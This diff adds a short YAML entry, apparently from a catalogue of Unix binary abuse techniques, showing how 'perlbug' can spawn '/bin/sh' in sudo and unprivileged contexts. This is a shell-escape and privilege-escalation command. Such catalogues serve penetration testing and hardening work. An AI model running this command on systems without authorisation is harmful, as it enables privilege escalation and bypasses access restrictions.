@@ -1,0 +1,11 @@
+---
+functions:
+  shell:
+  - code: |-
+      perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh #'
+    comment: |-
+      This requires to press `Enter` serveral times before the shell is spawn.
+    contexts:
+      sudo:
+      unprivileged:
+...
